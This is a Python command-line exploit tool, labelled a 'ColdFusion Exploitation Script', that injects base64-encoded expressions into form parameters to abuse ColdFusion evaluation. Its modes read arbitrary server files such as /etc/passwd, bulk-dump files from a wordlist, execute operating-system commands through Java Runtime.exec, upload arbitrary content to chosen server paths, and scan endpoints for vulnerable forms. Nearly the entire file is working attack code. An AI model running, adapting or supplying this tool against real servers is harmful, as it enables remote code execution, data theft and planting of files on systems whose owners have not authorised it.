#!/usr/bin/env python3

import argparse
import base64
import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup
import urllib3
from urllib.parse import urlparse
import time
from datetime import datetime
import os

class Tee:
    def __init__(self, *files):
        self.files = files

    def write(self,obj):
        for f in self.files:
            f.write(obj)
            f.flush()

    def flush(self):
        for f in self.files:
            f.flush()
current_dt = datetime.now()
log_filename = "output"+current_dt.strftime("%Y%m%d_%H%M%S")+".log"
log_filepath = os.path.abspath(log_filename)
log_file = open(log_filename,"w")

original_stdout = sys.stdout
sys.stdout = Tee(original_stdout, log_file)

# Suppress SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def decode_base64(data):
    """Decode base64 data"""
    try:
        return base64.b64decode(data.encode('utf-8')).decode()
    except Exception:
        return data  # Return as is if not valid base64

def craft_file_read_payload(file_path):
    """Create payload for file reading"""
    # For file paths, we ensure / prefix
    if not file_path.startswith('/'):
        file_path = '/' + file_path

    # Keep adding / until no padding is needed
    while True:
        encoded = base64.b64encode(file_path.encode()).decode()
        if encoded.endswith('='):
            file_path = '/' + file_path
        else:
            break

    # Encode without padding
    encoded_path = encoded
    payload = f"test1={encoded_path}&ToBase64(FileRead(toString(toBinary(TEST1))))=1"
    return payload

def craft_command_exec_payload(command):
    """Create payload for command execution"""
    # Old code that reads only the first line
    #java_code = f'CreateObject("java","java.io.BufferedReader").init(CreateObject("java","java.io.InputStreamReader").init(CreateObject("java","java.lang.Runtime").getRuntime().exec("{command}").getInputStream())).readLine()'.strip()
    # New code that reads all output:
    java_code = f'CreateObject("java","java.lang.StringBuilder").init().append(CreateObject("java","java.util.Scanner").init(CreateObject("java","java.lang.Runtime").getRuntime().exec("{command}").getInputStream()).useDelimiter("\\\\A").next()).toString()'.strip()
    
    # Keep adding spaces until no padding is needed
    while True:
        encoded = base64.b64encode(java_code.encode()).decode()
        if encoded.endswith('='):
            java_code += ' '
        else:
            break

    # Encode without padding by adding spaces
    encoded_command = urllib.parse.quote(encoded)
    # payload = f"test1={encoded_command}&ToBase64(Evaluate(toString(toBinary(URLDecode(TEST1)))))=1"
    payload = f"test1={encoded_command}&Evaluate(toString(toBinary(TEST1)))=1"

    return payload

def craft_upload_payload(file_path, b64_content):
    """Create payload for upload"""
    java_code = f'CreateObject("java","java.io.FileOutputStream").init("{file_path}").write(CreateObject("java","java.util.Base64").getDecoder().decode("{b64_content}"))'

    # Keep adding spaces until no padding is needed
    while True:
        encoded = base64.b64encode(java_code.encode()).decode()
        if encoded.endswith('='):
            java_code += ' '
        else:
            break

    # Encode without padding by adding spaces
    encoded_content = urllib.parse.quote(encoded)
    payload = f"test1={encoded_content}&Evaluate(toString(toBinary(TEST1)))=1"

    return payload

def get_origin_header(url):
    """Extract origin header from URL"""
    parsed = urlparse(url)
    scheme = parsed.scheme
    netloc = parsed.netloc
    origin = f"{scheme}://{netloc}"
    return origin

def parse_headers(header_string):
    """Parse headers string into dictionary"""
    headers = {}
    if header_string:
        # Split by comma, but be careful about commas in header values
        # We'll split by comma and then parse each key:value pair
        pairs = header_string.split(',')
        for pair in pairs:
            pair = pair.strip()
            if ':' in pair:
                # Handle potential quoted values
                if '"' in pair:
                    # Find first colon that's not inside quotes
                    key_part = ""
                    value_part = ""
                    in_key = True
                    i = 0
                    while i < len(pair):
                        if pair[i] == ':' and in_key:
                            key_part = pair[:i].strip()
                            value_part = pair[i+1:].strip()
                            break
                        i += 1
                    if key_part and value_part:
                        # Remove quotes from value if present
                        if value_part.startswith('"') and value_part.endswith('"'):
                            value_part = value_part[1:-1]
                        headers[key_part] = value_part
                else:
                    key, value = pair.split(':', 1)
                    headers[key.strip()] = value.strip()
    return headers

def send_request(url, method, payload, headers=None, verify_ssl=True, follow_redirects=False, debug=False):
    """Send HTTP request with payload"""
    # Start with default headers
    default_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    # Merge custom headers with defaults (custom headers override defaults if specified)
    if headers:
        default_headers.update(headers)

    final_headers = default_headers

    # Add Origin header automatically if not already present
    if "Origin" not in final_headers:
        origin = get_origin_header(url)
        final_headers["Origin"] = origin

    # Debug: Show request details before sending
    if debug:
        print(f"[DEBUG] Request Details:")
        print(f"Method: {method}")
        print(f"URL: {url}")
        print(f"  Headers:")
        for key, value in final_headers.items():
            print(f"    {key}: {value}")
        print(f"Payload: {payload}")
        print(f"Verify SSL: {verify_ssl}")
        print(f"Follow Redirects: {follow_redirects}")
        print("-" * 50)

    try:
        if method.upper() == "POST":
            response = requests.post(
                url,
                data=payload,
                headers=final_headers,
                verify=verify_ssl,
                allow_redirects=follow_redirects,
                timeout=30  # Default timeout
            )
        elif method.upper() == "GET":
            response = requests.get(
                url,
                params=payload,
                headers=final_headers,
                verify=verify_ssl,
                allow_redirects=follow_redirects,
                timeout=30  # Default timeout
            )
        else:
            raise ValueError("Unsupported HTTP method")

        # Debug: Show response details
        if debug:
            print(f"[DEBUG] Response Details:")
            print(f"Status Code: {response.status_code}")
            print(f"  Headers:")
            for key, value in response.headers.items():
                print(f"    {key}: {value}")
            print(f"Body: {response.text}")
            print("-" * 50)

        return response
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def extract_result(response, file_read=False, cmd_exec=False):
    """Extract and decode results from response"""
    if not response:
        return None

    # Process all responses, not just 200
    print(f"[*] Received HTTP {response.status_code}")

    # For 302 redirects, check if there's content in the response body
    if response.status_code in [200, 302]:
        soup = BeautifulSoup(response.text, 'html.parser')

        if file_read:
            # Look for ToBase64(FileRead(...)) result
            # Searching for input with name containing TOBASE64(FILEREAD
            inputs = soup.find_all('input', {'type': 'hidden'})
            for input_tag in inputs:
                name = input_tag.get('name', '')
                if 'TOBASE64(FILEREAD' in name.upper():
                    return input_tag.get('value', '')

        elif cmd_exec:
            # Look for Evaluate(...) result
            # Searching for input with name containing EVALUATE
            inputs = soup.find_all('input', {'type': 'hidden'})
            for input_tag in inputs:
                name = input_tag.get('name', '')
                if 'EVALUATE' in name.upper():
                    result = input_tag.get('value', '')
                    # Try to decode if it's base64
                    return decode_base64(result)

    return None

def parse_params(param_string):
    """Parse parameter string into dictionary"""
    params = {}
    if param_string:
        pairs = param_string.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[key] = value
    return params

def sanitize_filename(file_path):
    """Convert file path to a safe filename for saving"""
    # Replace directory separators with underscores
    safe_name = file_path.replace('/', '_').replace('\\', '_')
    # Remove any other potentially problematic characters
    safe_name = "".join(c for c in safe_name if c.isalnum() or c in "._-")
    # Ensure we don't have an empty name
    if not safe_name:
        safe_name = "unknown_file"
    return safe_name

def test_file_read(url, method, headers, verify_ssl, file_path, main_params, param_sep):
    """Test reading a single file and return if successful along with content"""
    exploit_payload = craft_file_read_payload(file_path)

    # Combine main parameters with exploit parameters
    exploit_params = parse_params(exploit_payload)
    final_params = {**main_params, **exploit_params}

    # Convert back to URL encoded string
    payload = param_sep.join([f"{k}={v}" for k, v in final_params.items()])

    # Send request without debug info in wordlist mode
    response = send_request(url, method, payload, headers, verify_ssl, False, False)
    if response:
        encoded_content = extract_result(response, file_read=True)
        if encoded_content:
            decoded_content = decode_base64(encoded_content)
            # Return the file path, content, and a small part of content as identifier
            identifier = decoded_content.split('\n')[0].strip()[:50]  # First 50 chars of first line
            return True, decoded_content, identifier
    return False, None, None

def wordlist_mode(args, headers, main_params, verify_ssl):
    # Process file paths from a wordlist
    if not args.wordlist:
        print("[!] Wordlist file is required for wordlist mode")
        sys.exit(1)

    # Read file paths from wordlist
    try:
        with open(args.wordlist, 'r') as f:
            file_paths = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read wordlist file: {e}")
        sys.exit(1)

    print(f"[*] Testing {len(file_paths)} file paths from wordlist")
    print(f"[*] Delay between requests: {args.delay} seconds")
    print(f"[*] Request timeout: {args.timeout} seconds")

    found_files = []

    # Create output directory if specified
    output_dir = args.output_dir if args.output_dir else "dumped_files"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
        print(f"[*] Created output directory: {output_dir}")

    for i, file_path in enumerate(file_paths):
        print(f"[>] Testing ({i+1}/{len(file_paths)}): {file_path}")

        # Test file read
        success, content, identifier = test_file_read(
            args.url, args.method, headers, verify_ssl, file_path, main_params, args.param_sep
        )

        if success:
            print(f"[+] Found accessible file: {file_path}")
            if identifier:
                print(f"    Identifier: {identifier}")
            found_files.append((file_path, identifier))

            # Dump content to file
            safe_filename = sanitize_filename(file_path)
            output_file_path = os.path.join(output_dir, f"{safe_filename}.txt")

            try:
                with open(output_file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(f"    Dumped content to: {output_file_path}")
            except Exception as e:
                print(f"    [!] Failed to write to {output_file_path}: {e}")
        else:
            print(f"[-] Not accessible: {file_path}")

        # Delay between requests, except for the last one
        if i < len(file_paths) - 1:
            time.sleep(args.delay)

    # Print summary of found files
    if found_files:
        print(f"\n[+] Found {len(found_files)} accessible files:")
        for file_path, identifier in found_files:
            print(f"    {file_path} ({identifier})")
        print(f"[*] All dumped files saved to: {output_dir}")
    else:
        print("\n[-] No accessible files found in wordlist")

def endpoint_scan_mode(args, headers, main_params, verify_ssl):
    # Scan multiple endpoints for vulnerable forms
    # Check if endpoint scanner module exists
    try:
        import endpoint_scanner
    except ImportError:
        print("[!] endpoint_scanner.py module not found!")
        print("    Please ensure endpoint_scanner.py is in the same directory as this script.")
        sys.exit(1)

    # Validate required arguments
    if not args.endpoint_list:
        print("[!] Endpoint list file is required for endpoint scan mode (-e)")
        sys.exit(1)

    if not args.base_url:
        print("[!] Base URL is required for endpoint scan mode (-b)")
        sys.exit(1)

    # Test file path defaults to /etc/hostname
    test_file_path = args.test_file if args.test_file else "/etc/hostname"

    print(f"[*] Starting endpoint scan mode")
    print(f"[*] Endpoint list: {args.endpoint_list}")
    print(f"[*] Base URL: {args.base_url}")
    print(f"[*] Test file: {test_file_path}")

    # Call the endpoint scanner
    endpoint_scanner.scan_endpoints(
        endpoint_list_file=args.endpoint_list,
        base_url=args.base_url,
        test_file_path=test_file_path,
        delay=args.delay,
        verify_ssl=verify_ssl
    )

def main():
    parser = argparse.ArgumentParser(description="ColdFusion Exploitation Script")

    # Single target modes
    parser.add_argument("-u", "--url", required=True, help="Target URL (for single target modes)")
    parser.add_argument("-m", "--method", default="POST", help="HTTP method (GET/POST)")
    parser.add_argument("-f", "--file", help="File to read (e.g., etc/passwd)")
    parser.add_argument("-c", "--command", help="Command to execute (e.g., pwd)")
    parser.add_argument("--upload", help="Base64-encoded file contents to upload")

    # Wordlist mode
    parser.add_argument("-w", "--wordlist", help="File containing list of file paths to test")

    # Endpoint scan mode
    parser.add_argument("-e", "--endpoint-list", help="File containing list of relative endpoint paths to scan")
    parser.add_argument("-b", "--base-url", help="Base URL (required for endpoint scan mode)")
    parser.add_argument("--test-file", help="File to test for reading in endpoint scan mode (default: /etc/hostname)")

    # Common options
    parser.add_argument("-o", "--output-dir", help="Directory to save dumped files")
    parser.add_argument("--delay", type=int, default=5, help="Delay between requests in seconds (default: 5)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Ignore SSL certificate errors")
    parser.add_argument("--headers", required=True, help="Custom headers in 'Key:Value' format, separated by commas")
    parser.add_argument("--params", help="Main request parameters (e.g., 'param1=value1&param2=value2')")
    parser.add_argument("--param-sep", default="&", help="Parameter separator (default: &)")
    parser.add_argument("--debug", action="store_true", help="Print full HTTP request and response details")

    # File upload arguments
    parser.add_argument("--target-file", help="the absolute file path to upload file contents")

    args = parser.parse_args()

    # Validate inputs - determine mode
    single_target_modes = [bool(args.file), bool(args.command), bool(args.wordlist), bool(args.upload)]
    endpoint_scan_mode_active = bool(args.endpoint_list)

    if not any(single_target_modes) and not endpoint_scan_mode_active:
        print("[!] You must specify either:")
        print("    - a file to read (-f), command to execute (-c), base64 content to write to remote file (-w), wordlist (-w), or")
        print("    - endpoint list for scanning (-e) with base URL (-b)")
        sys.exit(1)

    if endpoint_scan_mode_active and any(single_target_modes):
        print("[!] Endpoint scan mode cannot be used with single target modes")
        sys.exit(1)

    if endpoint_scan_mode_active and not args.base_url:
        print("[!] Base URL (-b) is required for endpoint scan mode")
        sys.exit(1)

    # Parse custom headers
    headers = {}
    if args.headers:
        headers = parse_headers(args.headers)

    # Parse main request parameters
    main_params = parse_params(args.params)

    verify_ssl = not args.no_ssl_verify

    # Handle endpoint scan mode
    if endpoint_scan_mode_active:
        # Debug functionality is disabled in endpoint scan mode
        if args.debug:
            print("[!] Debug mode is disabled in endpoint scan mode")
        endpoint_scan_mode(args, headers, main_params, verify_ssl)

    # Handle wordlist mode
    elif args.wordlist:
        # Debug functionality is disabled in wordlist mode
        if args.debug:
            print("[!] Debug mode is disabled in wordlist mode")
        wordlist_mode(args, headers, main_params, verify_ssl)

    # Handle single file read mode
    elif args.file:
        if not args.url:
            print("[!] URL is required for file read mode")
            sys.exit(1)

        print(f"[*] Reading file: {args.file}")
        exploit_payload = craft_file_read_payload(args.file)

        # Combine main parameters with exploit parameters
        exploit_params = parse_params(exploit_payload)
        final_params = {**main_params, **exploit_params}

        # Convert back to URL encoded string
        payload = args.param_sep.join([f"{k}={v}" for k, v in final_params.items()])

        # Send request with debug info
        response = send_request(args.url, args.method, payload, headers, verify_ssl, args.debug, args.debug)
        if response:
            encoded_content = extract_result(response, file_read=True)
            if encoded_content:
                result = decode_base64(encoded_content)
                print(f"[+] File content (decoded):\n{result}")
            else:
                print("[-] No file content retrieved")
                if response.status_code == 302 and not args.debug:
                    print("    (302 redirect received - use --debug to follow redirect)")
        else:
            print("[-] Request failed")

    # Handle command execution mode
    elif args.command:
        if not args.url:
            print("[!] URL is required for command execution mode")
            sys.exit(1)

        print(f"[*] Executing command: {args.command}")
        exploit_payload = craft_command_exec_payload(args.command)

        # Combine main parameters with exploit parameters
        exploit_params = parse_params(exploit_payload)
        final_params = {**main_params, **exploit_params}

        # Convert back to URL encoded string
        payload = args.param_sep.join([f"{k}={v}" for k, v in final_params.items()])

        # Send request with debug info
        response = send_request(args.url, args.method, payload, headers, verify_ssl, args.debug, args.debug)
        if response:
            result = extract_result(response, cmd_exec=True)
            if result:
                print(f"[+] Command output:\n{result}")
            else:
                print("[-] No command output retrieved")
                if response.status_code == 302 and not args.debug:
                    print("    (302 redirect received - use --debug to follow redirect)")
        else:
            print("[-] Request failed")
    elif args.upload:
        if not args.url:
            print("[!] URL is required for command execution mode")
            sys.exit(1)

        if not args.target_file:
            print("[!] File path is required for for file upload mode")
            sys.exit(1)
        
        print(f"[*] Executing file upload to {args.target_file}")
        exploit_payload = craft_upload_payload(args.target_file, args.upload)

        # Combine main parameters with exploit parameters
        exploit_params = parse_params(exploit_payload)
        final_params = {**main_params, **exploit_params}

        # Convert back to URL encoded string
        payload = args.param_sep.join([f"{k}={v}" for k, v in final_params.items()])

        # Send request with debug info
        response = send_request(args.url, args.method, payload, headers, verify_ssl, args.debug, args.debug)
        if response:
            result = extract_result(response, cmd_exec=True)
            if result:
                print(f"[+] Command output:\n{result}")
            else:
                print("[-] No command output retrieved")
                if response.status_code == 302 and not args.debug:
                    print("    (302 redirect received - use --debug to follow redirect)")
        else:
            print("[-] Request failed")

if __name__ == "__main__":
    main()

sys.stdout = original_stdout
log_file.close()
print(f"Log file available at {log_filepath}.")